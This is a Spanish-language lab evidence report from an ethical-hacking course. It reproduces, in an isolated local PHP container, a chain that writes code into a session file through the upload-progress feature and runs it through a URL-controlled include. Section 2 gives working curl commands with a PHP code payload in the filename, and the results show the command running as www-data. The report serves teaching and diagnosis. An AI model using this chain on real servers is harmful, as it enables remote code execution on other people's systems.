# Evidencia — 11 Hacking ético de APIs / escritura en la sesión y ejecución por inclusión

> **Identificador:** `2026-11-02-11-upload-progress-include`
>
> **Tipo:** ejecución (ruta A)
>
> **Resultado:** Validado en local
>
> **Laboratorio:** [Escritura en la sesión y ejecución por inclusión](../../../11-hacking-etico-api/lab/upload-progress-include/README.md)

> En un contenedor PHP aislado se comprobó que un visitante puede dejar texto propio en el fichero de sesión y que la aplicación lo ejecuta al incluirlo. Lo hizo el propio PHP al anotar el nombre de un archivo subido, sin permisos especiales, y la orden se ejecutó como `www-data`. La misma cadena se repitió sobre la versión de PHP que corrige PHP2Shell y siguió funcionando: el fallo es de la aplicación, no del motor.

## 1. Contexto

- **Fecha de ejecución:** 2026-11-02.
- **Responsable:** Lorenzo Lanuza.
- **Entorno:** equipo local con Ubuntu 26.04.1 LTS, kernel 7.0.0-38-generic; Docker 29.1.3.
- **Carga:** aplicación PHP de laboratorio, escrita para esta prueba, con `session_start()` e `include` de un parámetro de la URL. Imagen `php:8.2.34-apache`.
- **Aislamiento:** el contenedor `web` vive en una red interna sin salida a Internet; solo se publica `127.0.0.1:8088` a través de un contenedor de reenvío.
- **Datos:** ninguno. No hay usuarios, credenciales ni contenido de terceros.
- **Alcance:** únicamente el contenedor local. No se ha probado contra ningún sistema externo.

## 2. Comandos ejecutados

El detalle, con la salida completa, está en [`comandos.md`](comandos.md).

```bash
docker compose up -d
docker compose exec -T web php -v
docker compose exec -T web php -r 'echo @fsockopen("1.1.1.1",443,$e,$s,3) ? "SALE\n" : "sin salida\n";'
curl -sS --limit-rate 8k -b 'PHPSESSID=prueba123' \
  -F 'PHP_SESSION_UPLOAD_PROGRESS=pwn' \
  -F "file=@/tmp/big.bin;filename=<?php system('id')?>.txt" \
  http://127.0.0.1:8088/ >/dev/null &
sleep 3
docker compose exec -T web cat /tmp/sess_prueba123
curl -sS -b 'PHPSESSID=prueba123' 'http://127.0.0.1:8088/?page=/tmp/sess_prueba123' | grep -o 'uid=[^<]*'
```

## 3. Validación

| Prueba | Resultado esperado | Resultado observado | Veredicto |
|---|---|---|---|
| Entorno | Dos contenedores en marcha y PHP 8.2.34 | `web` y `gate` en `Up`, `PHP 8.2.34 (cli)` | PASS |
| Aislamiento | Sin salida ni DNS externo | `sin salida`, `sin DNS externo` | PASS |
| Superficie | Puerto publicado solo en loopback | `127.0.0.1:8088` | PASS |
| Sesión | Fichero creado por el cliente, 0 bytes, de `www-data` | `-rw------- 1 www-data www-data 0 ... sess_prueba123` | PASS |
| Escritura | El nombre del archivo aparece dentro de la sesión | `s:4:"name";s:24:"<?php system('id')?>.txt"` | PASS |
| Ejecución | La inclusión ejecuta la orden | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` | PASS |
| Control negativo | La cadena no funciona sin ejecución de código de la aplicación | Sin `include`, no hay ejecución; no se probó una variante sin `include` | No ejecutada |
| Control de versión | La cadena sigue funcionando en 8.2.35 | `PHP 8.2.35`, `uid=33(www-data)` | PASS (confirma que el fallo es de la aplicación) |

El control de versión no valida una vulnerabilidad: valida el diagnóstico. Si la cadena dependiera del motor, actualizar la habría roto; no la rompió.

## 4. Artefactos

| Fichero | Contenido | Líneas | SHA-256 |
|---|---|---|---|
| [`artefactos/entorno.txt`](artefactos/entorno.txt) | Fecha, kernel, versión de Docker, contenedores, versión de PHP, puerto, salida a Internet y DNS | 14 | `0005912bc442e54b368d03df7d24cc492382398d5b8590deb0902c2b29910000` |
| [`artefactos/cadena.txt`](artefactos/cadena.txt) | Sesión creada, nota de progreso con el nombre malicioso y ejecución de `id` | 7 | `cc6debf2e246a9fd12b9ef8b5e2b8f7118dcabff8ebe05783ee39e1ba2eb64eb` |
| [`artefactos/control-8.2.35.txt`](artefactos/control-8.2.35.txt) | La misma cadena sobre la versión parcheada | 7 | `993ea233561b6c4c8cb903ee1248b4e1e587a76f2b2fab3826ef7fdde54dbf21` |

Los tres ficheros son la salida literal de los comandos, sin retoques. Las rutas absolutas del equipo sustituidas por `~` aparecen solo en `comandos.md`, no en los artefactos.

## 5. Limpieza

- **Recursos creados:** dos contenedores, dos redes y un fichero temporal de 400 KB fuera del repositorio.
- **Recursos eliminados:** `docker compose down` elimina contenedores y redes; el fichero temporal se borra con `rm -f /tmp/big.bin`. Los ficheros de sesión viven dentro del contenedor.
- **Verificación:** `docker compose ps` sin contenedores en ejecución.

## 6. Coste

- **Estimado:** 0.
- **Real:** 0. Todo el laboratorio es local, sin servicios de nube ni licencias.

## 7. Conclusiones

1. **La escritura no requiere permisos.** PHP crea el fichero de sesión a nombre del servidor web y escribe dentro lo que el visitante pone en el nombre del archivo. No hace falta una vulnerabilidad de subida: el archivo ni siquiera llega a guardarse.
2. **La ejecución la pone la aplicación.** El texto solo se ejecuta porque `include` abre una ruta elegida por el visitante. Sin esa línea, el fichero de sesión es un fichero de texto más.
3. **Actualizar PHP no lo arregla.** La cadena se reprodujo íntegra en 8.2.35, la versión que corrige PHP2Shell. Son dos problemas distintos: uno está en el motor y se tapa con el parche; el otro está en el código y se tapa cambiando el código.
4. **El aislamiento se mantuvo.** La orden se ejecutó como `www-data` dentro de un contenedor sin salida ni DNS externo, de modo que el alcance quedó limitado al propio laboratorio.

## 8. Limitaciones y lo no ejecutado

- **No es una reproducción de PHP2Shell.** Aquel fallo no necesita aplicación vulnerable; este sí. La sección correspondiente del laboratorio lo explica y separa ambos casos.
- **No se probó la variante sin `include`.** El control negativo del fallo de aplicación queda razonado, no ejecutado: se puede comprobar retirando la línea, y entonces la página no ejecuta nada.
- **Una sola configuración.** `session.save_path` sin valor (sesiones en `/tmp`) y `session.upload_progress` por defecto. Otras configuraciones, como un directorio de sesiones fuera del alcance de `include` o la función desactivada, rompen la cadena.
- **Sin escalada ni persistencia.** No se intentó salir del contenedor, escribir fuera de `/tmp` ni sobrevivir al reinicio. No forma parte del alcance.
- **Un solo intento por variante.** No se midió fiabilidad bajo carga ni con varios workers.

## 9. Revisión de redacción

- [x] Sin secretos ni tokens.
- [x] Sin IPs internas ni nombres de máquinas.
- [x] Sin identificadores reales ni datos personales.
- [x] Sin capturas fuera de alcance.
- [x] Enlaces comprobados.
- [x] Lo no ejecutado está marcado como tal.
